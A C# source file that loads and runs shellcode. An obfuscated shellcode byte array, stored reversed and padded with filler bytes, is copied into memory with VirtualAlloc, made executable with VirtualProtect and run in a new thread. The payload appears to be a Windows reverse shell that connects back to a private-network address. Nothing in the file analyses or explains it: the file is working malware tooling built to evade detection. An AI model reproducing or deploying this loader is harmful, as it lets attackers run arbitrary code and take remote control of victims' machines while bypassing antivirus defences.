using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;

namespace TestAssembly{
    public class Program{
        public Program(){
            MessageBox.Show("Start!!");
            byte[] shellcode = new byte[] {
                0x58,0x50,0x58,0x50,0xc3,0x58,0x50,0x5f,0x58,0x50,0x58,0x50,0xcf,0x75,0x58,0x50,0x49,0x58,0x50,0x45,0x58,0x50,0x00,0x55,0x30,0x58,0x50,0x17,0x14,0x8a,0x58,0x50,0x1f,0x14,0x02,0x58,0x50,0x07,0x14,0x88,0x58,0x50,0x1f,0x14,0x86,0x58,0x50,0x07,0x14,0x8a,0x58,0x50,0x07,0x1c,0x02,0x58,0x50,0xc0,0xfe,0x58,0x50,0x58,0x50,0xdb,0x31,0x58,0x50,0xd6,0x75,0x58,0x50,0xc0,0xfe,0x58,0x50,0x07,0x14,0x88,0x58,0x50,0x1f,0x14,0x86,0x58,0x50,0x07,0x14,0x8a,0x58,0x50,0x16,0x1c,0x02,0x58,0x50,0x0f,0xe2,0x80,0x58,0x50,0xc2,0x89,0x58,0x50,0x07,0x1c,0x02,0x58,0x50,0x58,0x50,0xdb,0x31,0x58,0x50,0x00,0x00,0x01,0x00,0xef,0x81,0x58,0x50,0xf5,0x75,0x58,0x50,0xc0,0xfe,0x58,0x50,0xaa,0x58,0x50,0x58,0x50,0xc0,0x31,0x58,0x50,0x58,0x50,0x58,0x50,0x5e,0x58,0x50,0x58,0x50,0x0d,0x7c,0x63,0x80,0x24,0x93,0xe8,0x34,0x21,0x59,0x2f,0xf2,0x8a,0x82,0x7d,0x92,0x00,0x00,0x00,0x12,0xe8,0x58,0x50,0xdf,0x89,0x58,0x50,0x57,0x58,0x50,0x55,0x58,0x50,0x5d,0x58,0x50,0x59,0x58,0x50,0x5b,0x58,0x50,0xd8,0x75,0x58,0x50,0xc6,0x29,0x58,0x50,0xc3,0x01,0x58,0x50,0x58,0x50,0x58,0x50,0xd5,0xff,0x58,0x50,0x5f,0xc8,0xd9,0x02,0x68,0x58,0x50,0x57,0x58,0x50,0x53,0x58,0x50,0x56,0x58,0x50,0x00,0x6a,0x58,0x50,0x58,0x50,0x50,0x58,0x50,0x56,0x58,0x50,0x53,0x58,0x50,0x00,0x00,0x01,0x00,0x98,0x8d,0x58,0x50,0xd5,0xff,0x58,0x50,0xe5,0x53,0xa4,0x58,0x68,0x58,0x50,0x00,0x6a,0x58,0x50,0x51,0x58,0x50,0x00,0x00,0x10,0x00,0x68,0x58,0x50,0x40,0x6a,0x58,0x50,0x00,0x00,0x01,0x00,0x8e,0x8d,0x58,0x50,0xb2,0x2f,0x22,0x7c,0xf6,0x81,0x58,0x50,0x36,0x8b,0x58,0x50,0x58,0x50,0xd5,0xff,0x58,0x50,0x5f,0xc8,0xd9,0x02,0x68,0x58,0x50,0x57,0x58,0x50,0x56,0x58,0x50,0x04,0x6a,0x58,0x50,0x00,0x6a,0x58,0x50,0x58,0x50,0x58,0x50,0x58,0x50,0x58,0x50,0x58,0x50,0xd5,0xff,0x58,0x50,0x56,0xa2,0xb5,0xf0,0x68,0x58,0x50,0x58,0x50,0x58,0x50,0xd4,0x75,0x58,0x50,0x08,0x4e,0xff,0x58,0x50,0x58,0x50,0x58,0x50,0x20,0x74,0x58,0x50,0xc0,0x85,0x58,0x50,0x58,0x50,0xd5,0xff,0x58,0x50,0x61,0x74,0xa5,0x99,0x68,0x58,0x50,0x57,0x58,0x50,0x56,0x58,0x50,0x10,0x6a,0x58,0x50,0x58,0x50,0x58,0x50,0x97,0x58,0x50,0xd5,0xff,0x58,0x50,0xe0,0xdf,0x0f,0xea,0x68,0x58,0x50,0x50,0x58,0x50,0x40,0x58,0x50,0x50,0x58,0x50,0x40,0x58,0x50,0x50,0x58,0x50,0x50,0x58,0x50,0x50,0x58,0x50,0x50,0x58,0x50,0x58,0x50,0xe6,0x89,0x58,0x50,0xf0,0xf6,0x00,0x02,0x68,0x58,0x50,0x80,0x13,0xa8,0xc0,0x68,0x58,0x50,0x58,0x50,0x58,0x50,0x0a,0x6a,0x58,0x50,0x58,0x50,0x58,0x50,0xd5,0xff,0x58,0x50,0x00,0x6b,0x80,0x29,0x68,0x58,0x50,0x50,0x58,0x50,0x54,0x58,0x50,0xc4,0x29,0x58,0x50,0x00,0x00,0x01,0x90,0xb8,0x58,0x50,0x58,0x50,0xd0,0xff,0x58,0x50,0xe8,0x89,0x58,0x50,0x07,0x26,0x77,0x4c,0x68,0x58,0x50,0x54,0x58,0x50,0x5f,0x32,0x73,0x77,0x68,0x58,0x50,0x00,0x00,0x32,0x33,0x68,0x58,0x50,0x58,0x50,0x58,0x50,0x58,0x50,0x5d,0x58,0x50,0x58,0x50,0x58,0x50,0xff,0xff,0xfe,0xe6,0xe9,0x58,0x50,0x12,0x8b,0x58,0x50,0x5a,0x58,0x50,0x5f,0x58,0x50,0x58,0x50,0x58,0x58,0x50,0x58,0x50,0xe0,0xff,0x58,0x50,0x51,0x58,0x50,0x5a,0x58,0x50,0x59,0x58,0x50,0x61,0x58,0x50,0x5b,0x58,0x50,0x5b,0x58,0x50,0x24,0x24,0x44,0x89,0x58,0x50,0xd0,0x01,0x58,0x50,0x8b,0x04,0x8b,0x58,0x50,0xd3,0x01,0x58,0x50,0x1c,0x58,0x8b,0x58,0x50,0x4b,0x0c,0x8b,0x66,0x58,0x50,0xd3,0x01,0x58,0x50,0x24,0x58,0x8b,0x58,0x50,0x58,0x58,0x50,0x58,0x50,0xb8,0x75,0x58,0x50,0x24,0x7d,0x3b,0x58,0x50,0xf8,0x7d,0x03,0x58,0x50,0x58,0x50,0xe8,0x75,0x58,0x50,0xe0,0x38,0x58,0x50,0xc7,0x01,0x58,0x50,0x0d,0xcf,0xc1,0x58,0x50,0xac,0x58,0x50,0xc0,0x31,0x58,0x50,0x58,0x50,0xd6,0x01,0x58,0x50,0x8b,0x34,0x8b,0x58,0x50,0xff,0x31,0x58,0x50,0x49,0x58,0x50,0x58,0x50,0x00,0x00,0x00,0x80,0x84,0x0f,0x58,0x50,0xc9,0x85,0x58,0x50,0x58,0x50,0xd3,0x01,0x58,0x50,0x20,0x58,0x8b,0x58,0x50,0x50,0x58,0x50,0x18,0x48,0x8b,0x58,0x50,0xd0,0x01,0x58,0x50,0x58,0x50,0x00,0x00,0x00,0xaa,0x84,0x0f,0x58,0x50,0xc0,0x85,0x58,0x50,0x78,0x40,0x8b,0x58,0x50,0xd0,0x01,0x58,0x50,0x57,0x58,0x50,0x3c,0x42,0x8b,0x58,0x50,0x10,0x52,0x8b,0x58,0x50,0x52,0x58,0x50,0x58,0x50,0xd9,0x75,0x58,0x50,0x49,0x58,0x50,0xc7,0x01,0x58,0x50,0x0d,0xcf,0xc1,0x58,0x50,0x58,0x50,0x20,0x2c,0x58,0x50,0x58,0x50,0x08,0x7c,0x58,0x50,0x61,0x3c,0x58,0x50,0xac,0x58,0x50,0xc0,0x31,0x58,0x50,0x58,0x50,0x28,0x72,0x8b,0x58,0x50,0xff,0x31,0x58,0x50,0x26,0x4a,0xb7,0x0f,0x58,0x50,0x58,0x50,0x14,0x52,0x8b,0x58,0x50,0x0c,0x52,0x8b,0x58,0x50,0x30,0x52,0x8b,0x64,0x58,0x50,0xe5,0x89,0x58,0x50,0xd2,0x31,0x58,0x50,0x60,0x58,0x50,0x58,0x50,0x58,0x50,0x00,0x00,0x01,0x3f,0xe8,0x58,0x50,0xfc
};








            IntPtr funcAddr = VirtualAlloc((IntPtr)(0), (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            Array.Reverse(shellcode);
            
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            uint oldprotection;
            VirtualProtect((IntPtr)(funcAddr), shellcode.Length, PAGE_EXECUTE, out oldprotection);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            Thread.Sleep(5000);
            MessageBox.Show("End!!");
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_READWRITE = 0x04;

        private static UInt32 PAGE_EXECUTE = 0x10;

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}
